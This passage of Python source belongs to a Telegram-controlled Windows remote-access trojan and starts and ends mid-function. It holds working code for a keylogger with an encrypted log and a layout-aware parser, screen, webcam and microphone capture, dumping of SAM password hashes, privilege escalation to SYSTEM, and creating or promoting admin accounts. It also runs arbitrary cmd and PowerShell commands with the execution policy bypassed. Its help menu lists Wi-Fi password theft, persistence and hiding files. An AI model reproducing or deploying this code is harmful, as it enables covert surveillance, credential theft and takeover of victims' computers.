                        'ENABLED'
                    if not bool(gt('flags', 0) & _wcn.UF_ACCOUNTDISABLE) else 
                        'DISABLED'
                    )


                    r.write(
f'''SID         : {sid}
FULL NAME   : {gt("full_name",    NULL)}
NAME        : {gt("name",         NULL)}
DESCRIPTION : {gt("comment",      NULL)}
ADMIN       : {"TRUE" if gt("priv", -1) == 2 else "FALSE"}
ATTEMPTS    : {gt("bad_pw_count", NULL)}
LOGGED IN   : {lg}
STATUS      : {st}
\n''')
                


                return r.getvalue()
        
        case 'query_group':
            try:
                return ' & '.join(_wnt.NetUserGetLocalGroups(None, name))
            except Exception:
                return NULL
            
        case 'group':
            try:
                _wnt.NetLocalGroupAddMembers(None, group, 3, ({'domainandname': name},))
                return f'user ({name}) logged in group ({group}) [+]'
            except Exception as er:
                c = er.args[0] if er.args else -1

                if c == _exs:
                    return f'user ({name}) logged in group ({group}) [+]'
                
                elif c == _noex:
                    return f'group does not exist ({group}) [*]'
                

            return f'failed to logged user ({name}) in group ({group}) [-]'
        
        case 'ungroup':
            try:
                _wnt.NetLocalGroupDelMembers(None, group, (name,))
                return f'user ({name}) unlogged in group ({group}) [+]'
            except Exception as er:
                c = er.args[0] if er.args else -1

                if c == _noex:
                    return f'group does not exist ({group}) [*]'
            

            return f'failed to unlogged user ({name}) in group ({group}) [-]'
        
        case 'admin':
            try:
                uad = get_admin_group()
                _wnt.NetLocalGroupAddMembers(None, uad, 3, ({'domainandname': name},))
                
                return f'user is admin ({name}) [+]'
            except Exception as er:
                c = er.args[0] if er.args else -1

                if c == _exs:
                    return f'user is admin ({name}) [+]'
                
                elif c == _noex:
                    return f'user does not exist ({name}) [*]'
            

            return f'failed to admin user ({name}) [-]'
        
        case 'unadmin':
            try:
                uad = get_admin_group()
                _wnt.NetLocalGroupDelMembers(None, uad, (name,))
                
                return f'user is not admin ({name}) [+]'
            except Exception as er:
                c = er.args[0] if er.args else -1

                if c == _noex:
                    return f'user does not exist ({name}) [*]'
            

            return f'failed to unadmin user ({name}) [-]'
        
        case 'password':
            try:
                _wnt.NetUserSetInfo(None, name, _pas, {'password': password})
                return f'user ({name}) password set ({password if password else "empty"}) [+]'
            except Exception:
                return f'failed to change user password ({name}) [-]'
        
        case 'create':
            try:
                _wnt.NetUserAdd(None, 1, {
                    'name'     : name,
                    'password' : password,
                    'priv'     : _wcn.USER_PRIV_USER,
                    'comment'  : description,
                    'flags'    : _wcn.UF_SCRIPT | _wcn.UF_NORMAL_ACCOUNT | _wcn.UF_DONT_EXPIRE_PASSWD
                })
                return f'user is created ({name}) [+]'
            except Exception as er:
                c = er.args[0] if er.args else -1

                if c == _uex:
                    try:
                        _wnt.NetUserSetInfo(None, name, _pas, {'password' : password   })
                        _wnt.NetUserSetInfo(None, name, _com, {'comment'  : description})

                        return f'user is created ({name}) [+]'
                    except Exception: 
                        pass


            return f'failed to create user ({name}) [-]'
        
        case 'delete':
            try:
                _wnt.NetUserDel(None, name)
                return f'user is deleted ({name}) [+]'
            except Exception as er:
                c = er.args[0] if er.args else -1

                if c == _unf:
                    return f'user does not exist ({name}) [*]'
            

            return f'failed to delete user ({name}) [-]'
        
        case 'enable':
            try:
                u = _wnt.NetUserGetInfo(None, name, 4)
                f = u.get('flags', 0) & ~_wcn.UF_ACCOUNTDISABLE
                _wnt.NetUserSetInfo(None, name, _flg, {'flags': f})

                return f'user is enabled ({name}) [+]'
            except Exception as er:
                c = er.args[0] if er.args else -1

                if c == _unf:
                    return f'user does not exist ({name}) [*]'
            

            return f'failed to enable user ({name}) [-]'
        
        case 'disable':
            try:
                u = _wnt.NetUserGetInfo(None, name, 4)
                f = u.get('flags', 0) | _wcn.UF_ACCOUNTDISABLE
                _wnt.NetUserSetInfo(None, name, _flg, {'flags': f})

                return f'user is disabled ({name}) [+]'
            except Exception as er:
                c = er.args[0] if er.args else -1

                if c == _unf:
                    return f'user does not exist ({name}) [*]'
            

            return f'failed to disable user ({name}) [-]'




def get_all_titles(
    *,
    _gwt=win32gui.GetWindowText,
    _iwv=win32gui.IsWindowVisible,
    _gtp=win32process.GetWindowThreadProcessId
):
    r = {}



    def cb(h, _):
        t = _gwt(h).strip()

        if t and _iwv(h):
            pid = _gtp(h)[1]

            if pid not in r:
                r[pid] = t


        return True



    try:
        win32gui.EnumWindows(cb, None)
    except Exception:
        pass

    return r




def ps():
    phd = get_all_titles().get

    with StringIO() as r:
        au = r.write

        for i in psutil.process_iter((
            'pid',            'name',           'username', 
            'cpu_percent',    'memory_info',    'create_time',    
                              'status'
        )):
            pg = i.info.get
            

            pid = pg('pid',         NULL)
            cpu = pg('cpu_percent', NULL)
            pmm = pg('memory_info', NULL)
            tim = pg('create_time', NULL)


            if (cpu != NULL) and (cpu is not None):
                cpu = f'{int(cpu)}%'

            if (pmm != NULL) and (pmm.rss is not None):
                pmm = f'{pmm.rss >> 10} KiB'

            if (tim != NULL) and (tim is not None):
                t    = int(time() - tim)
                h, t = divmod(t, 3600)
                m, s = divmod(t, 60)

                tim = f'{h:02d}:{m:02d}:{s:02d}'


            au(
f'''PID    : {pid}
NAME   : {pg("name",     NULL)}
TITLE  : {phd(pid,       NULL)}
USER   : {pg("username", NULL)}
CPU    : {cpu}
MEMORY : {pmm}
TIME   : {tim}
STATUS : {pg("status", NULL).upper()}
\n''')



        return r.getvalue()




def kill(p):
    if p.isdigit():
        try:
            psutil.Process(int(p)).kill()
            return True
        except Exception: 
            return False
    

    ok = False
    
    for n in psutil.process_iter(('name',)):
        try:
            if n.info.get('name', '') == p:
                n.kill()
                ok = True
        except Exception:
            continue
    
    return ok




def launch(path, args, window=True):
    if not _exist(path):
        path = os.path.join(PATH_SHARE, path)

        if not _exist(path):
            return None
    

    try:
        win32api.ShellExecute(
            None, 
            'open', 
            path, 
            args if args else None, 
            None, 
            int(window)
        )
        return True
    except Exception:
        return False




def wincmd(c, output=False, timeout=600):
    try:
        ex = sp_run(
            c, 
            stdout  = PIPE if output else DEVNULL,
            stderr  = PIPE if output else DEVNULL,
            timeout = timeout,
            shell   = True
        ) 
    except FileNotFoundError:
        return f'command not found ({c})'
    except Exception as er:
        return f'{type(er).__name__}({er})'
    else:
        if not output:
            return ex.returncode == 0

        out = ex.stdout or ex.stderr
        return decode_bytes(mem(out)) if out else NULL




def powershell(c, output=False, timeout=600):
    try:
        ex = sp_run(
            ('powershell', 
                '-NoProfile', '-ExecutionPolicy', 'Bypass', 
                '-Command', c
            ),  
            stdout  = PIPE if output else DEVNULL,
            stderr  = PIPE if output else DEVNULL,
            timeout = timeout
        ) 
    except FileNotFoundError:
        return f'command not found ({c})'
    except Exception as er:
        return f'{type(er).__name__}({er})'
    else:
        if not output:
            return ex.returncode == 0

        out = ex.stdout or ex.stderr
        return decode_bytes(mem(out)) if out else NULL
        



def eventlog(
    *, 
    _hs='localhost', 
    _inf=' '.join,
    _ecg=EVENTLOG_CATEGORY.__getitem__,
    _etg=EVENTLOG_TYPE.get
):
    enm = shell('wevtutil enum-logs', output=True)
    alg = (
            enm 
        if enm else 
            '''HardwareEvents
System
Application
Setup
ForwardedEvents
Security''')


    with StringIO(alg) as buf, StringIO() as r:
        au = r.write

        for log in buf:
            try: 
                hd = win32evtlog.OpenEventLog(_hs, log)                
                vl = win32evtlog.ReadEventLog(
                    hd, 
                    win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ, 
                    0
                )
            except Exception:
                continue
            

            au(f'(EVENT {log}):\n')
        
            for e in vl:
                try:
                    try:
                        ctg = _ecg(e.EventCategory)
                    except (IndexError, ValueError):
                        ctg = NULL

                    au(
f'''\tID       : {NULL if e.EventID   is None else e.EventID}
\tRECORD   : {NULL if e.RecordNumber  is None else e.RecordNumber}
\tCATEGORY : {ctg}
\tTYPE     : {_etg(e.EventType, NULL)}
\tINFO     : {NULL if e.StringInserts is None else _inf(e.StringInserts)}
\tDATA     : {NULL if e.Data          is None else e.Data}
\n''')
                except Exception:
                    continue
                

            win32evtlog.CloseEventLog(hd)



        return r.getvalue()

    


def verify_cursor(c, *, _ex=('.cur', '.ani')):
    return (
        (c != 'none') and 
        _isfile(c) and 
        (c[c.rfind('.') :].lower() in _ex)
    )




def screenshot():
    try:

        with mss() as m:
            i = m.grab(m.monitors[0])
            return mem(to_png(i.rgb, i.size))
        
    except Exception:
        return None




def webcam_screenshot():
    cap = opencv.VideoCapture(0)

    if not cap.isOpened():
        return None


    try:
        ret, frame = cap.read()

        if not ret:
            return None
        

        ok, b = opencv.imencode('.png', frame)

        if not ok:
            return None
        

        return mem(b)
    except Exception:
        return None
    finally:
        cap.release()




def audio(s, *, _rt=44_100, _ch=2):
    put = None

    for (n, i) in enumerate(sd.query_devices()):
        if i['max_input_channels'] > 0:
            put = n
            break
    else:
        return None


    try:
        din = sd.rec(
            int(s * _rt),
            samplerate = _rt,
            channels   = _ch,
            dtype      = 'int16',
            device     = put
        )
        sd.wait()


        with BytesIO() as buf:
            with open_wave(buf, 'wb') as f:
                f.setsampwidth(2)

                f.setnchannels(_ch)
                f.setframerate(_rt)

                f.writeframes(din.tobytes())
        

            return mem(buf.getvalue())
    except Exception:
        return None




def display_img(path):
    img = opencv.imread(path)

    if img is None:
        return False
    
  
    title = _namep(path)

    win32api.ShowCursor(False)
    opencv.namedWindow(title, opencv.WINDOW_NORMAL)
    opencv.imshow(title, img)


    while True:
        opencv.waitKey(0)

        if opencv.getWindowProperty(title, opencv.WND_PROP_VISIBLE) < 1: 
            break


    opencv.destroyAllWindows()
    win32api.ShowCursor(True)
    return True




def init_clipboard(func, *args):
    try:
        win32clipboard.OpenClipboard()
        return func(*args)
    except Exception:
        return False
    finally:
        win32clipboard.CloseClipboard()




def keylogger():
    iah = str.isalpha
    isp = str.isupper
    glt = get_layout
    kre = kb.read_event


    cap = 'down'
    sep = '\u200F'
    enl = '\u2060'
    _LU = ('L', 'U').__getitem__


    buf = StringIO()
    au  = buf.write
    sz  = 0
    
    
    while True:
        sleep(3)

        try:

            if (
                not _isfile(FILE_KEYLOGGER_FLAG) or 
                (read_file(FILE_KEYLOGGER_FLAG) != '1')
            ):
                continue
            

            _HOTKEY = {'backspace': '[BACKSPACE]', 'enter': '[ENTER]', 'space': '[SPACE]', 'ctrl': '[CTRL]', 'left ctrl': '[LEFT CTRL]', 'right ctrl': '[RIGHT CTRL]', 'shift': '[SHIFT]', 'left shift': '[LEFT SHIFT]', 'right shift': '[RIGHT SHIFT]', 'alt': '[ALT]', 'left alt': '[LEFT ALT]', 'right alt': '[RIGHT ALT]', 'tab': '[TAB]', 'caps lock': '[CAPS LOCK]', 'up': '[UP]', 'down': '[DOWN]', 'left': '[LEFT]', 'right': '[RIGHT]', 'insert': '[INSERT]', 'home': '[HOME]', 'page up': '[PAGE UP]', 'page down': '[PAGE DOWN]', 'delete': '[DELETE]', 'decimal': '[DECIMAL]', 'end': '[END]', 'print screen': '[PRINT SCREEN]', 'scroll lock': '[SCROLL LOCK]', 'pause': '[PAUSE]', 'num lock': '[NUM LOCK]', 'clear': '[CLEAR]', 'esc': '[ESC]', 'f1': '[F1]', 'f2': '[F2]', 'f3': '[F3]', 'f4': '[F4]', 'f5': '[F5]', 'f6': '[F6]', 'f7': '[F7]', 'f8': '[F8]', 'f9': '[F9]', 'f10': '[F10]', 'f11': '[F11]', 'f12': '[F12]', 'windows': '[WINDOWS]', 'left windows': '[LEFT WINDOWS]', 'right windows': '[RIGHT WINDOWS]', 'num 0': '[NUM 0]', 'num 1': '[NUM 1]', 'num 2': '[NUM 2]', 'num 3': '[NUM 3]', 'num 4': '[NUM 4]', 'num 5': '[NUM 5]', 'num 6': '[NUM 6]', 'num 7': '[NUM 7]', 'num 8': '[NUM 8]', 'num 9': '[NUM 9]', 'num enter': '[NUM ENTER]', 'num +': '[NUM +]', 'num -': '[NUM -]', 'num *': '[NUM *]', 'num /': '[NUM /]', 'media play/pause': '[MEDIA PLAY/PAUSE]', 'media stop': '[MEDIA STOP]', 'media next': '[MEDIA NEXT]', 'media prev': '[MEDIA PREV]', 'volume up': '[VOLUME UP]', 'volume down': '[VOLUME DOWN]', 'mute': '[MUTE]'}.get
            
            
            i = glt()
            l = i
            h = ''

            while True:
                if sz >= KEYLOGGER_BUFFER_SIZE:
                    with open(FILE_KEYLOGGER, 'a', encoding=FILE_ENCODING) as f:
                        f.write(f'{encrypt(buf.getvalue())}\n') 
                        f.flush()
                        

                    buf.seek(0)      
                    buf.truncate(0)
                    sz = 0


                    if (
                        not _isfile(FILE_KEYLOGGER_FLAG) or 
                        (read_file(FILE_KEYLOGGER_FLAG) != '1')
                    ):
                        del _HOTKEY
                        break
        


                e = kre()
                
                if e.event_type != cap:
                    continue


                k = e.name
                
                if h != k:
                    h = k
                    l = glt()
                

                hk = _HOTKEY(k)

                if hk is None:
                    k = (
                            f'{_LU( isp(k) )}{e.scan_code}'
                        if iah(k) else 
                            k
                    )

                    au(f'{i}{sep}{l}{sep}{k}{enl}')
                else:
                    au(f'{hk}{enl}')


                sz += 1

        except Exception:
            continue




def keylogger_parser(mode):
    if not _isfile(FILE_KEYLOGGER):
        return b''
    


    _mdbs = mode == 'base'
    _mdch = mode == 'char'
    _mdhk = mode == 'hotkey'
    _mdnh = mode == 'no hotkey'



    _join = ''.join
    _isp  = str.isspace
    _LU   = {'L' : str.lower, 'U' : str.upper}.get
    _sep  = '\u200F'
    _enl  = '\u2060'
    _ctrl = '[CTRL]'



    _SPECIAL    = {'[ENTER]': '\n', '[SPACE]': ' ', '[TAB]': '\t'}.get
    _RU_SPECIAL = {'`': 'ё', '~': 'Ё', '!': '!', '@': '"', '#': '№', '$': ';', '%': '%', '^': ':', '&': '?', '*': '*', '(': '(', ')': ')', '-': '-', '_': '_', '=': '=', '+': '+', '[': 'х', '{': 'Х', ']': 'ъ', '}': 'Ъ', '\\': '\\', '|': '/', ';': 'ж', ':': 'Ж', "'": 'э', '"': 'Э', ',': 'б', '<': 'Б', '.': 'ю', '>': 'Ю', '/': '.', '?': ','}.get
    

    _EN = {'16': 'q', '17': 'w', '18': 'e', '19': 'r', '20': 't', '21': 'y', '22': 'u', '23': 'i', '24': 'o', '25': 'p', '30': 'a', '31': 's', '32': 'd', '33': 'f', '34': 'g', '35': 'h', '36': 'j', '37': 'k', '38': 'l', '44': 'z', '45': 'x', '46': 'c', '47': 'v', '48': 'b', '49': 'n', '50': 'm'}.get
    _RU = {'16': 'й', '17': 'ц', '18': 'у', '19': 'к', '20': 'е', '21': 'н', '22': 'г', '23': 'ш', '24': 'щ', '25': 'з', '26': 'х', '27': 'ъ', '30': 'ф', '31': 'ы', '32': 'в', '33': 'а', '34': 'п', '35': 'р', '36': 'о', '37': 'л', '38': 'д', '39': 'ж', '40': 'э', '41': 'ё', '44': 'я', '45': 'ч', '46': 'с', '47': 'м', '48': 'и', '49': 'т', '50': 'ь', '51': 'б', '52': 'ю'}.get
    _UA = {'16': 'й', '17': 'ц', '18': 'у', '19': 'к', '20': 'е', '21': 'н', '22': 'г', '23': 'ш', '24': 'щ', '25': 'з', '26': 'х', '27': 'ї', '30': 'ф', '31': 'і', '32': 'в', '33': 'а', '34': 'п', '35': 'р', '36': 'о', '37': 'л', '38': 'д', '39': 'ж', '40': 'э', '41': 'ё', '44': 'я', '45': 'ч', '46': 'с', '47': 'м', '48': 'и', '49': 'т', '50': 'ь', '51': 'б', '52': 'ю', '42': 'є'}.get



    def is_char(c, *, _bs='[', _be=']'):
        return not ( (c[0] == _bs) and (c[-1] == _be) )
     


    with open(FILE_KEYLOGGER, 'r', encoding=FILE_ENCODING) as f, BytesIO() as out:
        for l in f:
            try:
                dt = decrypt(l).split(_enl)
            except Exception:
                break


            left  = []
            right = []
            
            lap, lpp = left.append,  left.pop
            rap, rpp = right.append, right.pop


            for m in dt: 
                m = m.split(_sep)

                if len(m) == 3:
                    rgt, cur, key = m
                        
                    match cur:
                        case 'ru' : lng = _RU
                        case 'ua' : lng = _UA
                        case _    : lng = _EN  


                    func = _LU(key[0])
                    code = key[1 :]
                    

                    if func:
                        lap(func( lng(code, key) ))
                    else:
                        if (rgt == 'en') and ((cur == 'ru') or (cur == 'ua')):
                            lap(_RU_SPECIAL( lng(code, key), key ))

                        else:
                            lap(key)


                    continue



                hotkey = m[0]


                if _mdbs or _mdch:
                    if v := _SPECIAL(hotkey, None if _mdch else hotkey): 
                        lap(v)

                    continue
                

                match hotkey:
                    case '[HOME]': 
                        while left: rap(lpp())
                    
                    case '[END]': 
                        while right: lap(rpp())

                    case '[BACKSPACE]':
                        if left and is_char(left[-1]):
                            lpp()

                    case '[DELETE]':
                        if right and is_char(right[-1]):
                            rpp()

                    case '[LEFT]':
                        if not left: 
                            continue


                        if left[-1] == _ctrl:
                            lpp()

                            while left and (left[-1] == _ctrl): 
                                lpp()

                            while left and (_isp(left[-1]) or not is_char(left[-1])):
                                rap(lpp())
                            
                            while left and (not _isp(left[-1]) and is_char(left[-1])):
                                rap(lpp())
                        else:
                            rap(lpp())

                    case '[RIGHT]':
                        if not right: 
                            continue


                        if left and (left[-1] == _ctrl):
                            lpp()

                            while right and _isp(right[-1]):
                                lap(rpp())

                            while right and (is_char(right[-1]) and not _isp(right[-1])):
                                lap(rpp())
                        else:
                            lap(rpp())

                    case '[CTRL]':
                        lap(_ctrl)

                    case _:
                        if v := _SPECIAL(hotkey, hotkey if _mdhk else None): 
                            lap(v)



            left.extend(reversed(right))
            buf = mem((
                    _join(k for k in left if k != _ctrl)
                if _mdnh else
                    _join(left)
            ).encode())



            out.write(buf)
        return mem(out.getvalue())




def execute(cmd, send):
    match cmd.lower():
        case 'author': 
            send('''
Hello, welcome to my project!
This project is designed for remote computer access.
This version is (TELEGRAM BOT)
My name is Vladislav Khudash (17).
You can contact me on GitHub: https://github.com/vk-candpython
''')
            return
        
        case 'help':
            send('''Core Commands
=============

    Command                   Description
    -------                   -----------   
    author                    Information about creator of this project                                         
    help                      Help menu
    repeat                    Repeat command
    session                   About this session
    getpid                    Current pid
    getuid                    Current user
    getsystem                 Get SYSTEM rights
    config                    Bot config control
    account                   Control accounts connected to this computer
    autostart                 Bot autostart   
    restart                   Restart bot    
    exit                      Log out of this session
                 

File System Commands 
====================

    Command                   Description
    -------                   -----------                                                                                                                                                        
    pwd                       Get working directory
    cd                        Change directory         
    ls                        Get information about files or dirs in directory    
    mount                     Mount and unmount utilities
    mkfile                    Create or write file               
    mkdir                     Create dir     
    chg                       Change file utilities         
    rn                        Rename file or dir
    rm                        Delete file 
    rmdir                     Delete dir                          
    cp                        Copy file or dir
    mv                        Move file or dir
    hide                      Hide file or dir 
    unhide                    Unhide file or dir                        
    cat                       Download file
    zip                       Make archive directory
                 
                 
Networking Commands
===================

    Command                   Description
    -------                   -----------         
    inet                      Enable or disable Internet
    ipconfig                  Get network interfaces     
    route                     Get routing table
    arp                       Get host ARP cache                                                                                     
    netstat                   Get network connections
    wifi                      Find Wi-Fi or get Wi-Fi password
    site                      Website utilities

                                 
System Commands                                                    
===============

    Command                   Description
    -------                   -----------      
    device                    Device utilities                                                                            
    systeminfo                Get information about computer  
    dxdiag                    Get information about computer using dxdiag
    reg                       Registry utilities  
    gpedit                    Local Group Policy utilities  
    service                   Service utilities 
    task                      Task utilities 
    startup                   Startup utilities   
    app                       App utilities    
    env                       Environment utilities
    lang                      Language utilities
    user                      User utilities                 
    ps                        Get information about running processes 
    kill                      Terminate process    
    run                       Launch file     
    cmd                       Execute command in cmd   
    powershell                Execute command in powershell   
    eventlog                  Get events from the eventlog      
    time                      Get current time or change current time   
    date                      Get current date or change current date   
    logout                    User logout
    hibernate                 Hibernate computer
    sleep                     Sleep computer
    reboot                    Reboot computer         
    shutdown                  Shutdown computer       

                 
User Interface Commands                                                  
=======================

    Command                   Description
    -------                   -----------
    hashpass                  Dump contents of SAM and SECURITY and SYSTEM database
    mouse                     Mouse utilities         
    keyboard                  Keyboard utilities                                                                                                                                       
    clipboard                 Clipboard utilities                    
    screen                    Screen utilities
    webcam                    Take screenshot of webcam
    audio                     Record audio or play audio 
    img                       Display image
    msg                       Display message                     
    keylogger                 Keylogger utilities     
''', doc='help.txt')
            return
        
        case 'repeat':
            send('repeat (command) -c (amount) -d (second)  —  Repeat command')
            return
        
        case 'getpid':
            send(str(PID))
            return
        
        case 'getuid':
            send(f'{NODE}\\\\{USER}')
            return
        
        case 'getsystem':
            ok = getsystem()

            if ok:
                send('got SYSTEM rights [+]')
                os._exit(0)
            else:
                send('failed to get SYSTEM rights [-]')

            return
        
        case 'config':
            send('''
config -g  —  Get current bot config\n
config (TOKEN|PASSWORD|SEED) -s (value)  —  Set config option\n
config -r (TOKEN|PASSWORD|SEED)  —  Reset config option
''')
            return
        
        case 'account':
            send('account -g  —  Get accounts connected to session\n\naccount -d (id)  —  Delete account connected to session')
            return
        
        case 'autostart':
            send('''
autostart -l  —  Get information about bot autostart\n
autostart -c (name) -p (path) -a (none|args) -w (true|false)  —  Create file in bot autostart\n
autostart -d (name)  —  Delete file in bot autostart\n
autostart -r  —  Reset bot autostart
''')
            return
        
        case 'restart':
            launch(*(
                    (BOT_FILE_PATH, None    ) 
                if IS_EXE else 
                    (pyexe,         __file__)
            ))
            write_file(FILE_BOT_RESTART, '1')
            send('bot is restarted [+]')

            os._exit(0)
            return
        
        case 'pwd':
            send(os.getcwd())
            return
        
        case 'cd':
            send('cd (path)  —  Change directory')
            return
        
        case 'ls':
            r = ls()

            send(f'DIRECTORY : {os.getcwd()}\n{r}', doc='ls.txt') if r else send(NULL)
            return
        
        case 'mkfile':
            send('mkfile (path) -d (data)  —  Create file')
            return
        
        case 'mkdir':
            send('mkdir (path)  —  Create dir')
            return
        
        case 'rn':
            send('rn (name) -n (new_name)  —  Rename file or dir')
            return
        
        case 'rm':
            send('rm (path)  —  Delete file')
            return
        
        case 'rmdir':
            send('rmdir (path)  —  Delete dir')
            return
        
        case 'cp':
            send('cp (from_path) -t (to_path)  —  Copy file or dir')
            return
        
        case 'mv':
            send('mv (from_path) -t (to_path)  —  Move file or dir')
            return
        
        case 'hide':
            send('hide (path)  —  Hide file or dir')
            return
        
        case 'unhide':
            send('unhide (path)  —  Unhide file or dir')
            return
        
        case 'cat':
            send('cat (path)  —  Download file')
            return
        
        case 'zip':
            cur = f'{_namep(os.getcwd())}.zip'

            try:
                dt = make_zip()
                send(dt, doc=cur)
            except Exception:
                send(f'failed to make archive ({cur}) [-]') 

            return
        
        case 'inet':
            send('inet -e  —  Enable Internet\n\ninet -d  —  Disable Internet')
            return
        
        case 'ipconfig':
            r = ipconfig()

            send(r, doc='ipconfig.txt') if r else send(NULL)
            return
        
        case 'route':
            r = route()

            send(r, doc='route.txt') if r else send(NULL)
            return 
        
        case 'arp':
            r = arp()

            send(r, doc='arp.txt') if r else send(NULL)
            return
        
        case 'netstat':
            r = netstat()

            send(r, doc='netstat.txt') if r else send(NULL)
            return
        
        case 'wifi':
            send('wifi -g  —  Find Wi-Fi\n\nwifi -p  —  Get Wi-Fi password')
            return
        
        case 'site':
            send('''
site -p (url)  —  Open website\n
site -d (url) -n (name)  —  Download file from website\n
site -l  —  Get blocked sites\n
site -b (domain)  —  Block site\n
site -d (domain)  —  Unblock site\n
site -r  —  Unblock all sites
''')
            return
        
        case 'device':
            send('''
device -g  —  Get all devices on the computer\n
device -q (id|guid)  —  Get information about device\n
device -i driver (path)  —  Install device driver\n      
device -s device|driver (id|guid|name)  —  Delete device or device driver\n 
device -e (id|guid)  —  Enable device\n 
device -r (id|guid)  —  Restart device\n 
device -d (id|guid)  —  Disable device\n 
device -v (device_name|device_desc|bios_vendor|bios_version|bios_date|baseboard|baseboard_vendor|baseboard_version|cpu|cpu_id|cpu_mhz|cpu_vendor|os|os_edition|os_version|os_build|os_product|os_owner|os_date|node) (id)?  —  Get value about device or system\n       
device -c (device_name|device_desc) (id) -n (value)  —  Change information about device name or description\n
device -c (bios_vendor|bios_version|bios_date|baseboard|baseboard_vendor|baseboard_version|cpu|cpu_id|cpu_mhz|cpu_vendor|os|os_edition|os_version|os_build|os_product|os_owner|os_date|node) -n (value)  —  Change information about system\n 
device -u  —  Update configuration devices\n 
device -p (path)  —  Print file on printer
''')
            return
        
        case 'systeminfo':
            r = systeminfo()

            send(r, doc='systeminfo.txt') if r else send(NULL)
            return
        
        case 'dxdiag':
            shell(f'dxdiag /t {quote(FILE_DXDIAG)}')

            if _isfile(FILE_DXDIAG):
                try:
                    dt = read_file(FILE_DXDIAG, b=True)
                    send(dt, doc='dxdiag.txt') if dt else send('dxdiag data is empty [*]')
                except Exception:
                    send('failed to get dxdiag [-]')
                finally:
                    _remove(FILE_DXDIAG)
            else:
                send('dxdiag is not working [*]')

            return
        
        case 'reg':
            send('''
reg -i  —  Information about register\n
reg -c (key) -n (name)  —  Create register key\n     
reg -c (key) -n (name) -v (value) -t (none|sz|expand_sz|binary|dword|dword_big_endian|qword)  —  Create register value\n
reg -d -k|-v (key) -n (name)  —  Delete register key or value\n
reg -g (key) -n (name)  —  Get register value\n
reg -e -k|-v (key)  —  Get register enum key or value       
''')
            return
        
        case 'gpedit':
            send('''
gpedit -e machine|user -k|-v (main|key)  —  Get Local Group Policy enum key or policy\n
gpedit -g machine|user (key) -n (name)  —  Get Local Group Policy information about policy\n
gpedit -c machine|user (key) -n (name) -v (allowed|blocked|restricted)  —  Create policy in Local Group Policy\n
gpedit -d machine|user (key) -n (name)  —  Delete policy in Local Group Policy\n
gpedit -u  —  Update Local Group Policy
''')
            return
        
        case 'service':
            send('''
service -g  —  Get information about services\n
service -q (name)  —  Get information about service\n
service -c (name) -n (display name) -d (description) -p (path) -a (none|args) -m (autostart|manual|disable)  —  Create service\n
service -d (name)  —  Delete service\n
service -m autostart|manual|disable (name)  —  Change service start type\n
service -l (name)  —  Start service\n
service -r (name)  —  Restart service\n
service -s (name)  —  Stop service
''')
            return
        
        case 'task':
            send('''
task -g  —  Get information about tasks\n
task -q (name)  —  Get information about task\n
task -c system|users|user (name) -d (description) -p (path) -a (none|args) -h (true|false) -e (startup|logon|logoff|idle|time|event) (value)?  —  Create task\n
task -d (name)  —  Delete task\n
task -m enable|disable (name)  —  Change task state\n
task -l (name) -a (none|args)  —  Start task\n
task -s (name)  —  Stop task
''')
            return
        
        case 'startup':
            send('''
startup -g  —  Get information about startup\n
startup -q machine|user (name)  —  Get information about file in startup\n
startup -c machine|user (name) -p (path) -a (none|args)  —  Create file in startup\n
startup -d machine|user (name)  —  Delete file in startup\n
startup -m machine|user enable|disable (name)  —  Change file mode in startup\n
startup -l machine|user (name)  —  Start file in startup\n
startup -s machine|user (name)  —  Stop file in startup
''')
            return
        
        case 'app':
            send('''
app -g  —  Get installed applications\n
app -u (name)  —  Delete app\n
app -l  —  Get blocked apps\n
app -b (name)  —  Block app\n
app -d (name)  —  Unblock app\n
app -r  —  Unblock all apps
''')
            return
        
        case 'env':
            send('''
env -g  —  Get environment\n
env -q (key)  —  Get value of environment key\n
env -c machine|user|tmp (key) -v (value) -t (none|sz|expand_sz|binary|dword|dword_big_endian|qword)  —  Create environment key\n
env -d machine|user|tmp (key)  —  Delete environment key
''')
            return
        
        case 'lang':
            send('''
lang -g  —  Get installed languages\n
lang -i (name)  —  Install language\n
lang -d (name)  —  Delete language\n
lang -s (name)  —  Set language
''')
            return
        
        case 'user':
            send('''
user -g  —  Get information about users\n
user -g (group)  —  Get user group information\n
user -q (name)  —  Get information about user\n  
user -j (name) -g (group)  —  User join group\n  
user -uj (name) -g (group)  —  User unjoin group\n
user -a (name)  —  Make user admin\n
user -ua (name)  —  Unmake user admin\n
user -p (name) -o (none|old_password) -n (none|new_password)  —  Change user password\n
user -c (name) -p (password) -d (description)  —  Create user\n
user -r (name)  —  Delete user\n
user -e (name)  —  Enable user\n
user -d (name) —  Disable user
''')
            return
        
        case 'ps':
            r = ps()

            send(r, doc='ps.txt') if r else send(NULL)
            return
            
        case 'kill':
            send('kill (pid|name)  —  Terminate process')
            return
        
        case 'run':
            send('run (path) -a (none|args) -w (true|false)  —  Launch file')
            return
        
        case 'cmd':
            send('cmd -e (command)  —  Cmd execute command without output\n\ncmd -g (command)  —  Cmd execute command with output')
            return
        
        case 'powershell':
            send('powershell -e (command)  —  Powershell execute command without output\n\npowershell -g (command)  —  Powershell execute command with output')
            return
        
        case 'eventlog':
            r = eventlog()

            send(r, doc='eventlog.txt') if r else send(NULL)
            return
        
        case 'time':
            send('time -g  —  Get time\n\ntime -s (time)  —  Set time')
            return
        
        case 'date':
            send('date -g  —  Get date\n\ndate -s (date)  —  Set date')
            return
        
        case 'logout':
            shell('shutdown /f /t 0 /l')
            return
        
        case 'hibernate':
            windll.powrprof.SetSuspendState(1, 1, 0)
            return
        
        case 'sleep':
            windll.powrprof.SetSuspendState(0, 1, 0)
            return
        
        case 'reboot':
            shell('shutdown /f /t 0 /r')
            return
        
        case 'shutdown':
            shell('shutdown /f /t 0 /s')
            return
        
        case 'hashpass':
            try:
                send(str( hashpass.from_live_system() ), doc='hashpass.txt')
            except Exception:
                send('failed to hashpass [-]')

            return
        
        case 'mouse':
            send('''
mouse -p  —  Get current mouse position\n
mouse -d (true|false)  —  Display mouse cursor\n
mouse -t (0-7)  —  Set mouse trail\n 
mouse -c arrow (none|path) ibeam (none|path) hand (none|path) wait (none|path)  —  Change mouse cursor\n 
mouse -x (coordinate) -y (coordinate) -d (delay)  —  Move mouse\n
mouse -f (1-20)  —  Set mouse sensitivity\n
mouse -v (0|1|2)  —  Set mouse speed\n
mouse -l|-r|-m -c (click) -d (delay)  —  Click mouse button\n
mouse -b (true|false)  —  Swap mouse buttons\n
mouse -s (amount)  —  Mouse scroll
''')
            return
        
        case 'keyboard':
            send('''
